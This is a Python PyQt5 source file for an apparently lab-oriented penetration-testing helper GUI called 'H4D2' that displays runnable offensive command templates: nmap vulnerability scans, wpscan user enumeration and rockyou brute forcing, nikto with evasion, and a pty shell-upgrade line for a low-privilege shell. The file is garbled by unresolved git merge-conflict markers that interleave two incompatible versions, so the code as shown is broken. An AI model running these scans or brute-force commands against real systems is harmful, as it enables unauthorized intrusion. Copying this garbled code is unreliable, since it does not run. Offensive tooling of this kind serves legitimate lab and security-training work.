#!/usr/bin/env python3
import sys
<<<<<<< HEAD
from PyQt5.QtWidgets import *
from PyQt5 import *
from PyQt5.QtGui import *
from PyQt5.QtCore import *
import time
import subprocess
from subprocess import *

class MainWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.layout = QVBoxLayout()
        self.widgets = {
            "logo": [],
            "button_enter": [],
            "divider": [],
            "spacer" : [],
            "nmap" : [],
            }
        self.lhost = "127.0.0.1"
        self.initUI()

    def initUI(self):
        self.setWindowTitle('H4D2')
        self.setMinimumSize(QtCore.QSize(1000, 650))
        self.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
        self.setStyleSheet('background: #161219;')
        self.frame1()
        self.setLayout(self.grid)
        self.center()
        self.show()
        self.textbox = QtWidgets.QTextEdit()

    def center(self):
        qr = self.frameGeometry()
        cp = QDesktopWidget().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def clear_widgets(self):
        for i in reversed(range(self.grid.count())): 
            self.grid.itemAt(i).widget().setParent(None)

    def create_divider(self):
        divider = QFrame()
        divider.setFrameShape(QFrame.HLine)
        divider.setLineWidth(3)
        divider.setStyleSheet("color: #20C20E;")
        return divider

### Buttons ###
    def frame1_button(self):
        self.clear_widgets()
        self.frame2()

    def tabChanged(self, index):
        current_tab = self.tabs.currentIndex()
        if current_tab == 0:
            self.IP()
        elif current_tab == 1:
            self.HTTPHelper()
        elif current_tab == 2:
            self.PassiveRecon()
        elif current_tab ==3:
            self.lpe()

    def onActivated(self, text):
        # Get the IP associated with the selected interface
        ip = subprocess.check_output("ip addr show " + text + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", shell=True)
        self.lhost = ip.decode().strip()
        self.lhost_label.setText("Lhost: " + self.lhost)
        
### Frames ###

    def frame1(self):
        self.grid = QGridLayout()
        image = QPixmap("/opt/H4D2/logo2.png")
        logo = QLabel()
        logo.setPixmap(image)
        logo.setAlignment(QtCore.Qt.AlignCenter)
        self.widgets["logo"].append(logo)
        button_enter = QPushButton("Enter", )
        button_enter.setCursor(QCursor(QtCore.Qt.PointingHandCursor))
        button_enter.setStyleSheet(
            "*{border: 4px solid '#20C20e';" +
            "border-radius: 10px;" +
            "font-size: 20px;" +
            "color: 'white';" +
            "font-style: 'bold';" +
            "padding: 10px;" +
            "margin: 10px 600px;}" +
            "*:hover{background: '#20C20e';}"
        )
        button_enter.clicked.connect(self.frame1_button)
        button_enter.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
        self.widgets["button_enter"].append(button_enter)
        self.grid.addWidget(logo, 2, 7, 4, 6)
        self.grid.addWidget(button_enter, 8, 8, 1, 4)

    def frame2(self):
        ##############################################
        self.tabs = QTabWidget()
        self.tabs.setTabBarAutoHide(False)
=======
from PyQt5.QtCore import *
from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
import subprocess

class MainWindow(QMainWindow):

    def __init__(self):
        super().__init__()
        self.stacked_widget = QStackedWidget()
        self.setCentralWidget(self.stacked_widget)
        self.widgets = {}
        self.lhost = ""

        # Create home page
        self.home_page = QWidget()
        
        #create QLabel and set its pixmap
        self.image = QLabel()
        self.image.setPixmap(QPixmap("/opt/H4D2/logo2.png"))
        self.image.setAlignment(Qt.AlignCenter)

        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.show_main_page)
        self.start_button.clicked.connect(self.recon)
        # create a main layout 
        layout = QVBoxLayout()
        # create a horizontal layout for the image
        layout.addStretch()
        layout.addWidget(self.image, 0, Qt.AlignCenter)
        layout.addStretch()
        # create a vertical layout for the button
        self.start_button.setFixedSize(150,50)
        self.start_button.setStyleSheet("QPushButton { border: 2px solid green; }"
                                "QPushButton:hover { background-color: green;}")
        layout.addWidget(self.start_button, 0, Qt.AlignBottom | Qt.AlignCenter)
        layout.addStretch()

        self.home_page.setLayout(layout)
        self.stacked_widget.addWidget(self.home_page)

        # Create main page
        self.main_page = QWidget()
        
        # Set up the user interface
        self.setStyleSheet('background: #161219;')
        self.setWindowTitle('H4D2')
        self.setGeometry(1200, 0, 1000, 600)

        self.tabs = QTabWidget()
        self.tabs.setMovable(True)
        self.tabs.tabBar().setStyleSheet("QTabBar::tab:selected { background-color: #20C20E}")

        # Create tabs
        self.tab1 = QWidget()
        self.tab2 = QWidget()
        self.tab3 = QWidget()
        self.tab4 = QWidget()
        self.tab5 = QWidget()
        self.tab6 = QWidget()
        self.tabs.addTab(self.tab1, "Initial Recon")
        self.tabs.addTab(self.tab2, "HTTPHelper")
        self.tabs.addTab(self.tab3, "Linux Priv Esc")
        self.tabs.addTab(self.tab4, "Windows Priv Esc")
        self.tabs.addTab(self.tab5, "TTY Shell Breakout")
        self.tabs.addTab(self.tab6, "RevShells")
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
        self.tabs.currentChanged.connect(self.tabChanged)

        # Create a horizontal layout for the Lhost label and dropdown
        self.lhost_layout = QHBoxLayout()
        self.lhost_label = QLabel("Lhost:")
        self.lhost_label.setStyleSheet("color: 'white'; font-size: 16px;")
        self.lhost_combo = QComboBox()
<<<<<<< HEAD
        self.lhost_combo.activated[str].connect(self.onActivated)

=======
        self.lhost_combo.setFixedWidth(100) #set width of the dropdown
        self.lhost = "127.0.0.1"
        self.lhost_combo.activated[str].connect(self.onActivated)
        self.lhost_layout.addStretch()
        
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
        # Get the list of available interfaces
        interfaces = subprocess.check_output("ip link show", shell=True)
        interface_list = interfaces.decode().split("\n")

        # Extract the interface names and add them to the dropdown
        for interface in interface_list:
            if ": <" in interface:
                self.lhost_combo.addItem(interface.split(":")[1].strip())

<<<<<<< HEAD
        self.lhost_layout.addWidget(self.lhost_label)
        self.lhost_layout.addWidget(self.lhost_combo)
        self.lhost_layout.addStretch()
        ##################################################
        self.tabs.currentChanged.connect(self.tabChanged)
        self.tabs.setFixedSize(self.size())
        self.tabs.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
        self.tabs.tabBar().setStyleSheet("QTabBar::tab:selected { background-color: #20C20E}")
        self.tab1 = QWidget()
        self.tab2 = QWidget()
        self.tab3 = QWidget()
        self.tab4 = QWidget()
        self.tabs.addTab(self.tab1, "Setup Options")
        self.tabs.addTab(self.tab2, "HTTPHelper")
        self.tabs.addTab(self.tab3, "Passive Recon")
        self.tabs.addTab(self.tab4, "Linux Priv Esc")
        self.tabs.setCurrentIndex(0)
        #self.tabs.currentChanged.connect(self.tabChanged)
        self.grid.addWidget(self.tabs, 0, 0, 1, 12)
        self.grid.addLayout(self.lhost_layout, 1, 0, 1, 4)

    def IP(self):
        self.lhost
        self.tab1.layout = QVBoxLayout()
        self.scroll = QScrollArea()
        self.container = QWidget()
        self.container_layout = QVBoxLayout(self.container)
        self.container.setLayout(self.container_layout)
        self.scroll.setWidget(self.container)
        self.scroll.setWidgetResizable(True)
        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        self.container_layout.setContentsMargins(0,0,0,0)
        self.container.adjustSize()
        spacer = QSpacerItem(0, 25)
        divider = self.create_divider()
        self.tab1.layout.addWidget(self.scroll)
        self.tab1.setLayout(self.tab1.layout)



        shellPE = QtWidgets.QLabel("[+ I just got a low-priv shell !]")
        shellPE.setStyleSheet(
=======
        # Add dropdown and labels to layout
        self.lhost_layout.addWidget(self.lhost_label)
        self.lhost_layout.addWidget(self.lhost_combo)
        self.lhost_combo.setCurrentIndex(0)
        layout = QVBoxLayout()
        main_layout = QVBoxLayout()
        main_layout.addLayout(self.lhost_layout)
        main_layout.addWidget(self.tabs)
        self.main_page.setLayout(main_layout)
        self.stacked_widget.addWidget(self.main_page)

    def onActivated(self, text):
        # Get the IP associated with the selected interface
        ip = subprocess.check_output("ip addr show " + text + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", shell=True)
        self.lhost = ip.decode().strip()
        self.lhost_label.setText("Lhost: " + self.lhost)
        self.tabChanged(text)

        
    def show_main_page(self):
    	self.stacked_widget.setCurrentWidget(self.main_page)

    def tabChanged(self, text):
        current_tab = self.tabs.currentIndex()
        if current_tab == 0:
            self.recon()
        elif current_tab == 1:
            self.httphelper()
        elif current_tab == 2:
            self.lpe()
        elif current_tab == 3:
            self.wpe()
        elif current_tab == 4:
            self.tty()
        elif current_tab == 5:
            self.revShells()


    def recon(self):
        self.rhost = "127.0.0.1"
        if not hasattr(self, 'tab1_container'):
            self.tab1_container = QWidget()
            self.tab1_container_layout = QVBoxLayout(self.tab1_container)
            self.tab1_container.setLayout(self.tab1_container_layout)
            self.scroll = QScrollArea()
            self.scroll.setWidget(self.tab1_container)
            self.scroll.setWidgetResizable(True)
            self.tab1_container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
            self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
            self.tab1_container_layout.setContentsMargins(0,0,0,0)
            self.tab1_container.adjustSize()
            
            self.tab1.setLayout(QVBoxLayout())
            self.tab1.layout().addWidget(self.scroll)
        # nmap
        if hasattr(self, 'nmap'):
            self.tab1_container_layout.removeWidget(self.nmap)
            self.nmap.deleteLater()
        self.nmap = QLabel("[+ Nmap]")
        self.nmap.setStyleSheet(
>>>>>>> 1509ee17b44fc71102be71b84fd37e22ae293d89
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
<<<<<<< HEAD
        self.container_layout.addWidget(shellPE)
        shellPE_Scan1 = QtWidgets.QLabel(f"python -c 'import pty; pty.spawn(\"/bin/bash\")'")
        shellPE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellPE_Scan1)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
        

        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan1)
        self.container_layout.addLayout(label_layout)
        
        shellPE_Scan2 = QtWidgets.QLabel(f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
        shellPE_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(shellPE_Scan2)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan2.text()))
        copy_button.setStyleSheet(
        "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)

        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        shellPE_Scan3 = QtWidgets.QLabel("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp")
        shellPE_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +    
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(shellPE_Scan3)
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        self.container_layout.addLayout(label_layout)
        label_layout.addWidget(copy_button)
        label_layout.addWidget(shellPE_Scan3)
        self.container_layout.addLayout(label_layout)
#############################################################################  
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        self.container_layout.addStretch()

    def HTTPHelper(self):
        self.tab2.layout = QVBoxLayout()
        self.scroll = QScrollArea()
        self.container = QWidget()
        self.container_layout = QVBoxLayout(self.container)
        self.container.setLayout(self.container_layout)
        self.scroll.setWidget(self.container)
        self.scroll.setWidgetResizable(True)
        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
        self.container_layout.setContentsMargins(0,0,0,0)
        self.container.adjustSize()
        spacer = QSpacerItem(0, 25)
        divider = self.create_divider()
        self.tab2.layout.addWidget(self.scroll)
        self.tab2.setLayout(self.tab2.layout)
        
        Nmap = QtWidgets.QLabel("[+ Nmap]")
        Nmap.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(Nmap)
        
        rhost = "10.11.1.71"
        rport = "80"
        lport = "4444"
        
        nmap_Scan1 = QtWidgets.QLabel(f"nmap -p- -sT -sV -A  {rhost}")
        nmap_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmap_Scan1)
        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmap_Scan1)
        self.container_layout.addLayout(label_layout)
        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command1 = nmap_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmap_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        nmap_Scan2  = QtWidgets.QLabel(f"nmap -p- -sC -sV {rhost} --open") 
        nmap_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmap_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmap_Scan2)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command2 = nmap_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command2]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmap_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        nmap_Scan3 = QtWidgets.QLabel(f"nmap -p- --script=vuln {rhost}")
        nmap_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmap_Scan3)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmap_Scan3)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command3 = nmap_Scan3.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command3]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmap_Scan3)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        NmapMethods = QtWidgets.QLabel("[+ HTTP Methods]")
        NmapMethods.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(NmapMethods)
##############################################################################        
        nmapMethods_Scan1 = QtWidgets.QLabel("nmap --script http-methods --script-args http-methods.url-path='/website'")
        nmapMethods_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmapMethods_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmapMethods_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command4 = nmapMethods_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command4]))

        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmapMethods_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        nmapMethods_Scan2 = QtWidgets.QLabel("nmap --script smb-enum-shares")
        nmapMethods_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmapMethods_Scan2)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan2.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmapMethods_Scan2)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command5 = nmapMethods_Scan2.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command5]))

        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmapMethods_Scan2)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        nmapMethods_Scan3 = QtWidgets.QLabel("nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/directory/goes/here'")
        nmapMethods_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nmapMethods_Scan3)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan3.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nmapMethods_Scan3)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command6 = nmapMethods_Scan3.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command6]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(nmapMethods_Scan3)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        wpscanSSL = QtWidgets.QLabel("[+ WPScan & SSL]")
        wpscanSSL.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wpscanSSL)
##############################################################################        
        wpscanSSL_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --disable-tls-checks --enumerate p --enumerate t --enumerate u")
        wpscanSSL_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wpscanSSL_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanSSL_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wpscanSSL_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command7 = wpscanSSL_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command7]))

        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wpscanSSL_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        wpscanBF = QtWidgets.QLabel("[+ WPScan Brute Forcing:]")
        wpscanBF.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wpscanBF)
##############################################################################        
        wpscanBF_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt")
        wpscanBF_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wpscanBF_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanBF_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wpscanBF_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command8 = wpscanBF_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command8]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wpscanBF_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        wpscanAPD = QtWidgets.QLabel("[+ Aggressive Plugin Detection:]")
        wpscanAPD.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(wpscanAPD)
##############################################################################        
        wpscanAPD_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --enumerate p --plugins-detection aggressive")
        wpscanAPD_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(wpscanAPD_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanAPD_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(wpscanAPD_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command9 = wpscanAPD_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command9]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(wpscanAPD_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addWidget(self.create_divider())
        self.container_layout.addSpacerItem(spacer)
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        niktoSE = QtWidgets.QLabel("[+ Nikto with SSL and Evasion:]")
        niktoSE.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(niktoSE)
##############################################################################        
        niktoSE_Scan1 = QtWidgets.QLabel(f"nikto --host http://{rhost}:{rport} -ssl -evasion 1")
        niktoSE_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(niktoSE_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(niktoSE_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(niktoSE_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command10 = niktoSE_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )    
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(run_button)
        label_layout.addWidget(niktoSE_Scan1)
        self.container_layout.addLayout(label_layout)
#############################################################################        
        self.container_layout.addSpacerItem(spacer)
##############################################################################        
        nikto = QtWidgets.QLabel("[+ Nikto Standard:]")
        nikto.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.container_layout.addWidget(nikto)
##############################################################################        
        nikto_Scan1 = QtWidgets.QLabel(f"nikto --host http://{rhost}:{rport} -C all")
        nikto_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';" 
        )
        self.container_layout.addWidget(nikto_Scan1)
##############################################################################        
        copy_button = QPushButton()
        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
        copy_button.setFixedSize(QSize(20,20))
        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nikto_Scan1.text()))
        copy_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        ) 
        label_layout = QHBoxLayout()
        label_layout.addWidget(copy_button)
        label_layout.addWidget(nikto_Scan1)
        self.container_layout.addLayout(label_layout)
##############################################################################        
        run_button = QPushButton()
        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
        run_button.setFixedSize(QSize(20,20))
        command11 = nikto_Scan1.text() + "; bash"
        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command11]))
        run_button.setStyleSheet(
            "*:hover{background: '#20C20e';}"
